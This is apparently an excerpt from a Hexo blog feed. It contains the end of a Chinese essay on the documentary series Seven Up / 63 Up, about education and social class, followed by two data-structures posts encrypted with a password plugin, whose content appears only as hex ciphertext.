人生的起点，每个人作出的人生选择才
会真正决定他们的人生道路，而这些道
路和最终的结果是很难用某种特定的理
论模型加以概括的。





七岁看老的真实性：
如前所述，《人生七年》这一系列
来源于英国的一句谚语“七岁看老”。我
们似乎确实能够从 7 岁的孩子身上看到
一些 63 岁的老人的影子 ：当导演在第九
部中问及每个受访者是否可以从 7 岁的
影像中看到现在的自己时，几乎每个人
都表示自己确实“没什么变化”。
不过，“旁观者清”的我们似乎能
从他们的经历中发现更多——那就是
每个人都或多或少因其所处的环境和
几十年的生活历练而改变了。正如 14
岁的约翰所言，观众确乎无法在这个系
列中找到任何一个所谓的“典型”，但
作为观众的我们一定是被他们特定的
人生经历所吸引，因为他们每个人都是
真实、具体、生动的个体，毫无半点编
造和套路可言。谁能想到一直以来野心
最大、观念也最保守的约翰最终会回到
他母亲的故乡保加利亚，开始一心从事
慈善事业？这符合他的“人设”吗？但
仔细想想就会发现，无论我们看到怎样
的结果都不算不违和，其中一定同时蕴
含着偶然和必然 ；它让我们不得不抛弃
对某个阶层的成见，直面鲜活的生命。
这些个体让我们意识到，众多人生线索
交织起来的《人生七年》系列是一个
殊为复杂的系统，想要用一句话来概括
整个系列基本是徒劳的 ；任何人都无法
在行动中欺骗自己，生活本身便蕴藏着
无穷的真意。教育在阶层流动间扮演的重要角色已是众
所皆知。相比之下，英国这样的发达国家，教育
的现实状况更加严酷。思想家布尔迪厄在《国家
精英 ：名牌大学与群体精神》一书中早就指出 ：
“教育机构被资本和权力划分为一个个场域，学
生在名校中也直接受到社会精英的垂青和赏识，
学习能力与文化资本、社会资本正相关。”英国
上流社会的孩子几乎都在剑桥、牛津等名校接受
教育，进入名校，在某种意义上也象征着拿到了
上流社会的入场券。《人生七年》中虽然没有真
正实现“逆袭”的人，但尼克的出现，还是让人
们看到了“读书改变命运”的可能性。




教育改变阶级代表人物介绍：
尼克出身于一个农场主家庭，算是平民
阶层，既不富裕，也不穷困。如果他复制父
辈的生活，大概就会过上平淡无奇的日子，
在郊外过着田园生活。但从小就喜欢读书的
尼克很早就明确了从事科学研究的理想，并
在青年时代进入了牛津大学物理系。此后，
他的人生与科研紧密绑定，先后在美国、英
国从事核物理领域的研究，42岁时终于当上
了大学教授。尽管在第九部中，尼克说自己
不幸患上了喉癌，但他并不遗憾过往的努
力，生活也的确没有亏待他。一分耕耘，一
分收获，从农场小子变成大学教授，好的教
育在其中扮演了最重要的角色。






广泛性；
《人生七年》的故事不仅属于英国，其中
蕴藏的社会规则与人生观念适用于很多国家。
事实上，美国、俄罗斯、日本、南非等国也
出现了各国版本的《人生七年》，无论哪个版
本，都能给人以启迪，想必结合现实，每位观
众都能与之产生共鸣。



总结：
《人生七年》系列纪录片的拍摄进行到《63 up》，已不再
只是阶级的记录，而是极大程度展现人文关怀。相比研究者
身份，编导麦克早已真正变成这些孩子生命的参与者，他们
的老朋友，尤其是在最后几集时，受访者们更多的是在向他
讲述自己的人生历程，63岁的尼克不幸患上喉癌，他正在和
病魔做斗争，而为图书馆孩子贡献一生的琳恩由于健康问
题已经去世，参与采访的是她的家人们。总之，《人生七年》
记录了14位受访者从孩提到老年的时光，他们每个人都见
证了英国的世代变迁，也从未有一个人真正放弃生活，他们
都活出了自己平凡又独特的人生，这才是这部纪录片的重
要意义所在。
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>数据结构 图</title>
    <url>/2020/12/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="56f05a4fb711941cce9c9ae3d035c2c4c41e532889559a9fbaa2a655da347fda">d4155f2e349f5b8b303096873299bda74dac8e4916ace7f6713e912a2b246d71798d5e9a48ae3e5247ab36eda792d83dd456dda9ebdb22274f0aa60c2cb34891bb3e7b43a04825b4425fc276c68163fcd753193a73abfa8acec007ea6db8a9446a3ed3cb006faba252b62ea94f33738e02313b154ecb42ee12f563724c52ce1dad077af66d261947c66b270e83745ff4f80a6461fadda26f2e8ff476d9d11e79d8df501d9058863a5ecf36bded799eda4a066f1ac4b04de1f880079c801386ee9919e90a127f5e4540fc7640ce5eb19dcaaa6f9697a1273fd07cec46943ba42ce7e30ac2a62c5fe7febf9d2de38d0ec72659545f56ceca3d2513b72029730177ade0f2d9e95ef023bcc6149e0579dfd0a7d06bf9ec46f94650390fa969809898418f0835bb0d3cacf9004b27318e1cc35b33b0912f64dc3de6cca652446fb284ed9b3b6dfc3c9137fcea540315641f9a3c8cbfeed871db8c38c8e39a0b53b807e275352e6fd0138a8fcf1e8f7d1666f58dead4212db39c422946028b3ee358f41f753532ae422779dfda4423e6b18364038f450c246dbc5b9b06dac2ac0197119c006140f19ca1546b03c8919b3c0cd0ad7dbf9c8d5aedd98cc8849f42c50eae45680e3434a9ccdd37fa342908b9bd658e66e4a6f798409e3c986aa01f296932bf6294dd725f882487eca38e0c67e93c607e5abc9991cb93ed0bf587923310f8f9579a3389aba83b39249c7f137b74ed9536ec8f751de12ac8ff88ee5422b1aad95c9c30eb721463006962ccc4d2524bfaf1caa55f86c8eb1ab22d0ef88fdca8312c90ca1940fb318f93b264eee88d795181314d318017d06e379e6b2fb212eac0d09a6739e8643802ece5b703a299ab59d4a453722f0a8dd927b77353393c1cdcc00ca229700a5089d0369ba06c28b1987a59932eacc100a21892363426a8f14b76648b55858bf6205f46f31483d51b851fa704738904d4987b3738b088a71a1b42c2de04af552b44950599ec067175020ce42b6ddb9599b5f43b1e93adddeae2b92eab2e205baed463f67e84b92515b7f101f9449e2fae456eccb8252a665125426bf84ddbe6aeac1daa2d46e487bcbec31e9abe067c2fe15c15257cd691153f4483503ff21f16c71f79c2d44829b6b0c6b0acae4d90efd435992decdf66bc3a8a0eb3124c10bcbbccf8c59925b17f0557663091d597ab52502f859d524bcd522ab9e800e6a5f1863d7e02b076702aec486a26baa92f0b33fa5f311aaa7bb6eb9fd082fb1b5456b1a8feec424892af81bc43efc413e10a86c6de0300ca8dbd3bbea73c92d091c0a4188df6e8c979d046224312f0f1410910301b22e476337b0ed4288daad0b1b26beb07a4f1eaf31b7911b4f5aecb255f97e90999640914cd3c84de9f4ba68fee34a12762545ad5e5ce67d26f98f8f8b7a2654becdcf4d5e4dcae2db4b6cb7d43a227b8de55494a96b4d2b5d93183c7ad372af16dc14c23aa5d50cd43012165612e2cd0812abddde953973e0081cad3c734c719659e6b71015c083e4c61a57d370772ea5680a6d79e7908af5fbf62baee526e9587ae3f2f2905768efb4006c5fca7de97d0ddb16b68288acbc551adf353b53efb5f9d7a6d240f23ada62ee99e951ee5963abeb2902a09480a166cc376af603a60b8f4053b6a33c0c6eb16dad3666c78f59c8796f45fc9c9408508a57e59eeef72e27e043908434ebf94a57fbdfd2e3ab35254a193183b80f081bce2fda3ce9dfd08bdfe1a3bd8d3c93343da56a2d3a8ef08ae0bdbd0082c25ab3316a573b496ddacaa368018779cc350fc01953e9b8f428e43dfe703bd9a2968f092abc3acc2822fe2792aecca2a5949c95b62f01639386d3e5a425adcc8c84cf247728b52084cb1a30a26f590c42089d6bc598bea5ab74b6fcb1d247c80fbbbdf77d8790f3b2e93a0a2fa3773df93f7347b35928435046a6c87bdedbe5e58b252f7a210d3271579001d2e9b6711572d69291777a42ffdd32bef5fd9cd40f2884f84431ebb2141f757f37a2aaf1b3d2ad057fb481d7a9e1baf253ecf55afc8b6d428560d529b7f01c0d7f8b323d431b1ffff15238b0399f7bd608ad07dbc98a88fadd11529adc43301efce3e334c0826f45d64b7ce8d15a93d315c00173520de22db73868d140da0c651a2efd42ebdf3ce5356e564be85d424bf711c9bf5fdf7178866d211590db049f88585e7ff1de274dfd2b527339186c846674cae401b6719b4a9358236be3b6409e463ad748566ea0a7c1fa94a1888fa1fe6a55e976c2603d10d77cf12680171ebf0b16a91afe01f61bfa498c6400766c3df3fb0e0e2aa41e3ab70583c5b42cddb9231e5b72738b83ad3ef1f20cb8506e9911b58d3d39c58b6b78ae0d0f998a0908c4e77f91908232db8f9be67afb032eaed3ab835d02117d17d61b98c15dbcba6196791c783f0e619ec54b4fc832b2eb82a089f5cb5ccfc980f9e2cbb2fb5e77d5c54db89956f6e3782eff0c5d92ffb75b32a65f50793ca9143ca0c9ba30b7323add65d67c1f75ad6becf49480f4f3e0a45c3b30717735c5816dc008200b472db7a1f7edea40eacced36ec9224350340b7dcd6eb3a78cbe36762f6410b712132e080b9b16291d9cc2d7b2addacd8ada868558b8fa51b91dba8dbecde23dd4b7d41d60ecbe453a1d22895ec6f00a178d0f18a92ce5d24efcbd0254aa6291914953f356a421d2c1bb787a71fb2d6a808afa4b4b6ad97f7f496ee7215dcfa3bbabd572e03d8d14af0b7d83e0e3c973bea1298b2eb3b8049fe6f875cc7db6c91f9a55e76237bde5651d50ee03971fa63c6ad102c6e2f8047598eb19b6335ca89d91b372dda74f6a0d89be44555f0bad3a1634aac97dfbd5c7666e2faecc9f84d03aeb0d3343e161b155cb932fba88935346fbcaa348d0f969d4e5d9ee92d00b1f25a32969405269fcd3b6b3e14ce61cddaeb066ef877a697ab6540eef715b0f591c43984b0e570eb58fae26aaf9a5d76581b162c7d9b60de44fb234ac10c35d4c6707e064b46d4a641285af10ff0fde45d3c6982792ada7fa8e1b0cdd2a51c53ad8c85d4b304672b144f4aa650acb5a79ca41209a7f11f9b8bc5e807d08d670c69b505f7be6b16615f4712b7da050a7c8c72f96f83d792438bb9f7d0f1584cd32d2b93851dfe84d7f8d0fe5c811b2893bc2a72a0d54a5fb7ef2359f3b3062fe253a477534f177131f0855e178f60115520db3ad20b58a855a87adf20d06fbf40c0ced4f25706b02670eef4ece1d437118f5dbba3760607a60dd4f9880ef7ec5a2bacb0827</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>数据结构-二叉树</title>
    <url>/2020/12/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="f1bc43b3515ae10691b97452156bf4ab52c738cbb87efea1b518c574b988d127">d4155f2e349f5b8b303096873299bda74dac8e4916ace7f6713e912a2b246d71798d5e9a48ae3e5247ab36eda792d83dd456dda9ebdb22274f0aa60c2cb34891bb3e7b43a04825b4425fc276c68163fcd753193a73abfa8acec007ea6db8a9446a3ed3cb006faba252b62ea94f33738ee951d791d15ec14f38be1d0c569f567827cfcd1975c761389ee665c0433372faddd6c42cd30309c4c181839def319d24f2ab1b8cd4c1f6c2ae57194c36955af376b330af2a540b2e88197a1563c510c9abb2dc3d0b953a73934692b682777cea4a4be2e2a1d66439f8ce5e852128996a9e0c1148691fc43dd4595f1e407b173b5676f136a0c00676b356299213b5e01f616e91bbe38d6eba260e687c44e5a5969333472bb840215f68cddad6bfaae508ef1f6e8abef20f71a9b0921a46cb2c5a379155e219b15782e54625d5e12ab17aa93cb9a3a9ea1a79589c49d3c47e03f5d76fc3a4480c62b05bb95b9d77b383cb0f16a9a5f5224496464a689437c10b0bfd180b09be05d9c8469079b7197c5f6920b5a07aa4d1a78d3e30cc412ba324776eca320594d105ce385f0b0403e154df7cc160be4d48e6ecc561bf096c22e5731523b5278c3012d19827f4c5d86b2a87fb620d3d464525d0caf46c633b38beabbe7757d3caa5ca8df32209e6ec7dcb2f739a3e77ba00a8f1feee3500bba32eac02bbd4162351e8b743956490d80c63d9d24157d1f91718f913d6e5ded193d8f7962c05b43dcb540419976d64106ac3b5a822ce3d98c02992b9efb28416929196f9344eb6593f029e56aa6173f19b44c0d38b8161229ef63b2f700bca79d7747acc8663a9c6896bf9ba29033291db31e15b61d03b2cbb08c41923a5fea31d6e8a80860e237413c17a3da1434dad0caa56a3989bc9cd6e95d82b73a4ce7b360d17d02ce1fc4a9371afffb6f04fba396bd393fab3c129a7d51afd9e3660bf2f4f0df8673f817d8dd8790503141187dd7034c58ae8d8d86b8408d10767b00bec3e270aa686e8cad0d3e747b8f70fdb860f2a871a082216a7668601b5440ad81cf1170bd620b84c973f77e0b8e8b6d8393e1c2f0963d2a7c856a3a9b7e9c76233b71362035b05d116d345091fd7cfb81d3878064fa459403870c56619d710c1ccb9c1c4b1352b839ffb109e0265a79c1bffef18ebf5c0980d0e5f249ad9d45cf5759f78df1ad6283dba00d8447cc0f1b47620a29eaa39841684b41fcaf32ab53b8c6174fd98e6de3c24c310623e11465540589e3b8d3808533c2c3c8f0ceff2cf199ede7b033d47127730cd04c28827ee14fcdc145d1d31eb5ea2b4eee7e3c7d1eed34733cdc0741017cbcf47175330fa78603e19cf96def36e9dbf098ab9f7c1b81a87536e70e33c937f3ab0aee9ed0d078a077fb65da85e8b816d7230c969338a9420b6a93cae55f8939190e80247b700999d464a3b0fedf91259223e4d5ef695db6d1a502d271e0d9ce8f04483d65ab28881709768d4561de5ad3fb73d537f527b4af31055d188040eeac21816370469aa9c3e6f712a874818989a1a63d00ee6152219edc5b125a67d2ff09d5fe0eba687180f0b1d16dbcc9f25594cfd80a3ef1685b5183b44d078b49eeb73e26238010317541a1cab5d711a3e833832a74f1fe6d3983d44a6539aa100dda99b0308c796c2636ee128eac1623068780c20c2931c8dd87f38804fb6d39f512994e86c1665487dcf619c7e8cfb3d1aa6a5281e9215675dbd7374be69fdaf69ffd63b041167c2f4eac54c4b1e3c18b1f19aee43e77b6cf23db451245cd00eb5ccaeba26dad309a6030145a1f8e2ad636d32f10f4e8c5e5e621fb184f8abf9cacc224f39d3ca0c190480ed5c5640da72d7eef773db3b7882547371a5ac510da10f4f263c8a6f9dcd80a47e2595b143bd2a06915baf7b2fd85701d8267739a919a5044550c83cae5acde998d6244634f24a33369b09cdbbd7fbad9942c888f9c184aed09c855ebbc28c2d9479bdb97f2e48ccf6f0bcede3a8d7c5a57dc4e50e7b30e2a95ca9278d4bddac2d98ffe97bb487fa584d24313288f9641c4aae9d2fadbd979555ceee2d00d32874ddde6f5af70f5550dda45bba8072d605b6978be4f97211a45d194dcb328bc48caf179d7a0a187023298f056b8a5d199ed78d60469afc812e1c5ff2c6225e3c8eacafab8804e8224c03d3c87d681fdb2957eff1f618e25ad9e8d2592a8d9f97ac84a23e326200356c2da18f168698a0489443c81d436d7ee6aa8fc7983159edaf1a83193f6c2519c26b227a4ed2742b99fc91e227f551bcd28e2325280aea3eeb0fb25dad9a9a958799eea14bc752be21f18b83689ecbceb6faedf05fc044c796f5b149e93d3c2ba8abd4df5ca73b11d5c4b62f77ffcbc3bc8dd801b7694be0aac5ce00ef56c775ab304bcf65902b5ee7660fd1a36b8a262950244bf7afa310997bb621f9f798d7b64194b457ce5fdcedfc4cefd1b70d285a4585de17f4497af243b383f4f31ccd6d33321d64d329caf13b933ad7822b8054d1cd45d9f4120d96bfbe4ed94665cbdef6ff83db5e042b812a47b3a970d6182ab395f824fb064e873596d54ac5407ce364ff2b9ecfd6d2f7e32af77cc48cebde8359f0955e383ddf7c7fb3fc7ba0dac5f9a43634f1856ffe983dfd56518e55236436e192386a81bde3a2783b83df93f773349f3261091c6b0ecd119481414fbe38d230ad2488d651d70e935d5c79fce371cca1f0716281497b3c1d233264d933c6dbee83acc162a1cd12dfdc258fb1c9461abb1d819a0ce1d07e48353f1e614d0f5d0ba81a92afbc74523bde2c3a4296d0578d911fca92c00fdb438dcfeb322eaa66e1d32a3a61da64185572f0fe93c6544bc0c0a46d6416ae2fa6e9c121ac9412e171fa2a812182ca0a88ab5f47fda1962d9329482cd06e629edceda6dd902b19a0256373e48b4184dd0da8537ffcf15415e5a20bc18ecfbf194fa7211c3f0c0afd8d926ac9f7680e7f98c27f85396edb6c3b496419ae2887d64286a73100e865e5d22c9488d39259f8ab3e95dbcb30874ee461f5566f98107789322454f1baee600ac1f0e01beec91e4c71abc6cfea69820ed8f25b49c06afefc8bb1b1b35cbbe267adb0254aa9b069a5282bd435084497aef5fd6534c24d4a308c261bb1c87996fa24132d286bb38266cd9538370d23f7393b45976420148c6852115a45afb1473124a0c46a031e5179329e7911e11f0f478ed5087a12aef2d27f7e3080bb1c1670d353651350b280ce3300cc6d6d9028ab630aa75fca33efcba35d33a844f986899cfdfb63099bb569697262c96bf2971694d4f49ebf6ca905cab6dd0a3810427c2b79f8096ad6b7bbe06a59585fab954cac94df0bf8667544f47418f91983ba9e7cd200c96bb8dc48817df05326896b00d2144357767bd93aaee6190bd10f61b63bcc340b9e24e19d2945da3148a8697b19b8a4654385c5b67dea7b1f68e20403479999d390b63831a6f2fb8d153ce169069f59eb536a27b9c14df9368b86b145759d1f463df6b3da3d534b940f6ad63eec72f77e84ef072190ae4a33ccd6efc167b5330ba059359b1f4c181599a50d0fcec15d6f5a34b68083b0649c98bbac1402df3572749a226ec93a840eeb0cc9aba0cd60ff20b3d27a768f892b3b63c10f2f87a09bd7e61f39016dd6b4e3af67746b752f485a49f53aa4464896a50d79fa71a4a16ff55515d14b368fb06876aef9ac50325a92c2d849bc8df4b82fe9a9763a35f8b40b236f5bed1ce01d557574b19cab03551577f088824e3556079904e028ba512c50ada12b0ea6c6e68de6820db8515a837100b2e4d5a0a03326db377a757b7564ed58745c2a266930d3c4f5658b773015ff90407a166f98a85188c7746e78fa8abe85e12d5d09ebbc4ed8653b66556d1235c6a6d2a9d85a3542a65bd56f514167967b8f8bf5c7815a45d8746fa984cdf70a8bd81cfd4757d92f0fadbd87a13426ea8a02cf5d4c1ed92b18f710eff96b0c50f566a3b7e09b1055d22187451bd0ca8280410a3b67ef841f0bfd082d935555447cbbff455dbdeed312ca1119a3c8aa13890f9e0dcd30d7a5b8fc30b993a5351f112d2a591fce86f47b61d87095ffdd6f152644e0bb9ead04a5170b45b443366081459efc73bfab7c6b3b0ab6c1d885f97e0cef53c8fbc4d5353af1bb822a927555dd23156983cc33a1142d9b6aaff39720d6249d3dbbda66cdad799391031cb8b90e9a6ab11a7366dd03f98f7ee632ca130859a0ebcbd198071a9de7f93a0f972afdae62768b105a2e0be2ec528d32b39c169a962d7526ff31b5d078909290142323f713e2fd6af5fbd090cf9b9781bec4588705255b8d3be24d1ef164bab1980371ef2d2b4df1a88c08411a1fdbaaa7c9b114163ce19e6eafb7d7b242a20a027964b6db2f341ada411806be7352febf88f765d543e6613e6f866d62231450778e91fd6f8125fd82a0fd88caa33a93e3eb95f8f599241ce1faf2f8ebd2c08a5a998ff6506147283cb7a9a6002fc526bf20a7e4892080cfc551bd74fc60055df03ff5388a5e02462ca4bca1a7838ae9593709cb39cac55e11110b27809fe090c87d0ba9251171a32d868ea1731ffe456374722174cac0f8e3678d779725864f305e4d667bb5a2662abd7d8e9f50d895c9879b2176e9400a012cc1cbf280239191b8b70644f4ab47dfccd9f3612bd6a0422ef62ce68eaa3481a94b8f0ff16cd8a83d342282b3e9fa2fe8cb340c1e32a034b0f7c7233013a538cf0e38c3a9badb974636c228f759ed8e7b5f1bcd6ab88ad60d1d4107a4ad8a71c3933eaa49862ebdd0bf59df781145726ab9dbd27b2f0b596ab9a3c853acbf66a7c71cdafae606a67074f0c398dc0ed49e67ffa674b6d68b3bbc3c5777071d5b6effc8bebd5801adfda7b9a5490590aca5ad834aba12fb966a61adb868322bf0d23d731f520115dfc42644a57eaa4cc40b21d427ce6d376ecbeeacaa9fe92872c3251070ebc34eeaabca8a56ceb9117d047f8228ddec07a02bba59f034a02c6ac90c7c046c5e26027a94c581b34589970147ecf8b647bf1f4815ae63b07e580060228d3878a111c304114242cf2afeb4f8f35e37c2b188eeffa39d636c16232f37da2a5eacc7329456d689f865c4d2e3340784f9ce015fc582e70e669721be28d6825335a9e8fb8cc8e58bdcf9950f1f078e175b4d57e970528b99c42b7f3a2df9287e791f4871415d6a8de9e6c2b8c70119113b057be82d0ecd491e74cc4cae60152be21ecd67e56ee7673b07319e54107674c237583033f938fb708281461337f1a14fa22c237ec0cc1f9c405cd2b24cb4e56b7f5aecbb2b288fc365740b5aff2049f1e9648c401c37c7e958bd28674273077f7363bef77a31decccfaad887f82ca60cfcfeb0ecb6ace12a87a022e360b63d0dd0fda130a4bfae52f119842b214365f14868187392023c5fe3dae6596a3a65df5834ca861f4f8d2a25f090fc99da9ae4f9558868d8d7de63e5c329f85543128c33a565afdc55259accf8495a5e311a220593f807f08b95eb2d88ba94bf1760273d2827cb007a37a4147e200a20e600f193b5f0a0be988bdd0a673af4710a07b6113bf174e4993261fd255bd2252cd0b00fa8333282db1597149cf986b2b670bf9f3727b8a90e2efa096c70fd651b30c81356ecc5121f39992b4fc506bb28ae8bf15fd902fbc6623057b6e1043b41e10c2b53c4db76e0c0bffc2f51fc9254571054afb2fb141bff0c0bff783fe9e4743e85dd0e9c999d0881d259d4eb85235a13a34fa81c3f9cc583ba1a21d6880d69835209ffab33400cfd6c4f548f4e20c0ffe2125fb1390146ec8cc74b7f270bb6b02d8397b1fcce7c3ba7c133a2383e17dae84664329e0ed96505998ede91e9e86fb3f68cfa3774811f2730f39837613c78a2be9c794ec1995353e7eb3264ddbd681d4e8689a7b67798a6ed1f0cdc25d8c4072575688d9d586b9f26c4cd9d997a5883914114be104ffae5b3a07db40257bf84061fc97fda1939d2bbf926332247a091692cff9783bf727e99197b6d77715b190979d09e389bd694482a44722c1a3bed7869726b75ce3d91fac11b854d83e9abcc8c909cd8a22b7af5b9dfcca6acba9883682b4360a761419643c5d76e43776e5c37d53f1a79d58a8e84e4ce3ee5270108908a15663fb04d4860b262120ae618bac79e95e8d0241211f0c844d8a827f00111a28028147347d49b94abc34e2b185f69baba6c915c3d6cfc8517de9bca466d243627c1db21ae486b86a1db2ecaa7fae21de05c6ce81f070e0f87dff1ee789c63ccfad06d4e269b8034a41b881ba62b4cf65a3ed2f9a2fa0e42d73e1c2681913e32e6727f9b37bae007e9115199bedb41ce6bbb6f4e4f72ada38fcaeb87f887f533ae3c844c199e6a7a2b26c64d35af8a1621b873d2b9fa6ebd8108362ea93a3432b609750ceeff74ba160fa36ab770df613f804f1e3a23004e57f696b963542597cdeb7881e7c53e2b79b64ad8a4f890773663e76fcf0e2b0d192e81a7d784758af1ed4bfe0b74fa578e1e20d1b1baf09e35e6c0fcfc865289a43874fd32cfe0a8650f798835f4fd4cfd4d94f88f18bfc2d32f442afe04f8970970237b6db05258cdababc937029f6a4889c079ba7fe57ee8a6edf4ea6fbb5d9db70f6301cf9b36c9fd8a14be57b66f7d474d57dd942c1b6ea294333cda33c9a57a392520590352661da82c80f511a030940931789d60814bccba9a30198040c3f6fe9304834ad45f7b9e9d4b6dd8a60e07200fc416ebd1fddbe285ede48b46d9666f36c7410179fda1d27e5eae4e607a1ea44e32494d03cdf628ef94afea3834e35d7669a9158156622b8b9defed440ad477a6c9ec18b94aa86ea588af0f117a01482b645883dcd07a5ec6cb5bd431fc90410947ced89c8aace11055eefe316395e635bd0b4c62f0bd9981b36b0029766071446bf0c9f83a931de564e82bfb149fbdf7434e61b2eeab38a77565cbdbffab516a6c758a0f253bce8a790549b9d08e8342c1fb20bd305ade215a1212d1a71b5cee4160d24d6340afb4a0cc2fb49beb08309c65a81c285c34c565581258691322f760ed000846adb913a0b8d2eb67754cb2113a7a5d815c29a308127bf3ebf61561ea955dc8a992b4dd47b727ded4625bc6224d3f81642c8ab74217291a66b7e8c5a100b688c47c7592619257719bd296858c2aa34c6ba7269c03490fe5d07255cc9be924f00579aada61e865495bf79cc5ddde869157e54b4b153779c51c1fe1df3b81caf900c6694c93160a69476f9193119f88d03edb67baaa98cd5ba9dd8d0f057e64d88d7280782f9ca468c566bf04106f12ec5e81bbaf534bfd1fb8cbbd633be543f62d3dc1c951adb10009e02130d490c74f06d146ee6b652dbb66449b8fa60c0d0bccd8e288302ba8ad2cee2f0b0f0059cbd94dda8e408e75d4c7afb3c93881e3fbcc78054ecf183b623a38e7990ff334e4b2b448a1674564b366814ef8f05f634b0537ee39077495b3ec253d60a2aeccfb576174a7b621f9141574811094f645d1195e375c5aa9e49f32f6c119bb4ef74f096789269cd50ee89bf0bf4a7818d79807762d03a705b11dcdda11a72b329e2612318c844fc8d57d7ba17bfac2a112cd07d0bafd14a2966e8c93ce82b2323ad701ac641c0b2b2dd38eeafdc8de9425b1baf2b0d593106664f36fb116f7b78314902a770a9a44cb396bc51f97ca538da951c2ff093edcf62a30bcdf9a7d8084a55fc92eb66ca002027950cc3eb218085a6d28fe94f54787b4e98e89b7c8c81116ba718308720b48b7b673ab310fde3f6a1eef797be1045d78fdc80097aebfc5795656be1818975782cc25c198a81e355eb30fa04e174b832a6345d2f48acacd3301ae9a23b50bbeb74ebc43d2da8392783a8043b19638fdcd215396c01650df92fdee2cba108633829967ffc0e7c485066145b662323befa9c2cc2e009271dbfb1cdec69d566c0959437e0ed1405792e0dfe4b8bf63aefaaffc1f73f4eacd248dda94ce2845449b16870797f50d265426c793ab5fe3cd097b588db1b22b868a6e855e13101ddcbc193b6315f26ca5b79eae7741abdd91d947cf503ae4f5451ce6334bc5df6e00c38fd8c3cfc9d2151b8d38bcc09191c66b7982ad8eb45980568d43464a7df89fd0f0aa20fcc4466b55b832915da57fb8666e3270ee651e6561d3e749ff437baa0c82fa9b758d5152484d09d057159727da69cbe32d12466321992000687f8a3a048d0c9cdd41bfec46e65be34e020bad729a63a72e6cbe136a5eedc611f7d111b7a4c355beec54f42376af69f7e0e3012bbd8245d5ddbf7347723b5fd1eb955af1018151af46b90d806a678c20e1a16744ddde3dde2d7ed65db3c89c7deec6d3a7b1a569e6a3307ddafe249aa3182d79df297afedcfe4048ab812f2af2e83d50054fb5d9603e6f26edaa1c977112bf08372384978dba74d58a81c577ec67f58a518857b666e4e3021d38291e02965794ee74710f2f2bf73d3caec343a03596e38a59e1d32391141b6d2c8f0cc094b75dd1de547f9fe87fa3e7e4c84890f9307525dfa081920610e9a53768614ab37807b2c9456d213502e1ab62c0b555be6347c195fadc6633e49aa10e2cf56e6bd141d4644780bad7f73506a2f8f6b13bb9d453fb2b94c3933e62b023ae0def1ba6435d0af1cc25e11dda5d3115b216fe3c8084f75573d0c4e6a6d86c51876ca26fe038589838347c7e4fe45f4cb7daa49cf905f45c20d0d5dbc6fff36bfe3f7aa2a0ae560d92e00e3c0c935ebc803e5626d63a63d730b9b1739f0e711a59fa23481d742529415eea65b31bb913d3234844d10d5596a83db2e12c83ef2cbaa2c549044ecef855d86229952450a7a90918f9bb8123b8b09434fedbb34928443f649e18facfaea16b8e524b57703babbc53411f46d718969a0860514e75f05e1f55108a7c318a17159dbac720ef79fd5979c60ad7595e74396b2610b197fec30a4338dd2752f647e7cee21bd3a12c9e3c314a0cd862f54daae05c68fb3897b422f52b4e9a8649f39eff318392e2c9a2464213e9deab1b64ec5cd74551f6b21a3587d1609665905c51b3bd51295ecb1f046490d82bad93fdb49ab3cee8b7a8f7db2bac09d32a90a3e7cb7f5b5ef9da71beb9481eec4f553b2ebd8d4d559c1c5110bf5ad234ac17b399366f14a05d660fe0e75b2a66dedf5e72eeb1891a681bd8f089ffc8dfa5327362a7ff641e3ac703af723af1c8cda9e048d96d8b1da52a508fee427c69ada96ff816319743e75234b0559cb3e60af389455b7b37a63b8277fdc57a160af37310236d2b43189ef36c4057e15afb38c952b6c6dc3aaff01991e09df26afebc912eb2f6beca9d8d8a98a77b80442d047ca6df6006db9ccb9af463254ebe0de388dc5d1c905f0e7fdbbb07d31164cbab691722da512cc1e5d8ceee6310b4afa720d92463ad06164e5e6c220eccd5d1c0486d323925e3db148fbe18c2cbb1e46478528dbc5326f869113333fc9456a2bbe0dd4776939dea32e99c738d033ca8e9d809be784a69acaabd248a025b3df68eb9cf5b62e1e79f55e157b9574f04de48fda65104bf30d715a41179c0743ec47ce94f5e71090f4ad378ad40d74210b592b61d20eaeea420d7a3ae3d5e471990647c61a2c90e42ad8518017d3ec9eeaca652a6d61001303bddf7e1ecd055f86f6de6310a4f158c16369c3a838da7e588b1c77795719d922ab17e039b3b89ff